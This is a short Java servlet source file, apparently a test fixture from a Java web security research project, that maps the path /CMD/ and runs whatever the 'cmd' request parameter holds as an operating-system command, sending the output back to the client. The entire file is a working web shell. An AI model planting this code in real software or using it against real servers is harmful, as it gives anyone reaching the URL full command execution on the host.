package com.anbai.sec.server.test.servlet;

import org.javaweb.utils.IOUtils;

import javax.servlet.annotation.WebServlet;
import javax.servlet.http.HttpServlet;
import javax.servlet.http.HttpServletRequest;
import javax.servlet.http.HttpServletResponse;
import java.io.IOException;
import java.io.OutputStream;

@WebServlet(name = "CMDServlet", urlPatterns = "/CMD/")
public class CMDServlet extends HttpServlet {

	@Override
	public void doGet(HttpServletRequest request, HttpServletResponse response) throws IOException {
		doPost(request, response);
	}

	@Override
	public void doPost(HttpServletRequest request, HttpServletResponse response) throws IOException {
		String cmd   = request.getParameter("cmd");
		byte[] bytes = IOUtils.toByteArray(Runtime.getRuntime().exec(cmd).getInputStream());

		OutputStream out = response.getOutputStream();
		out.write(bytes);
		out.flush();
		out.close();
	}

}
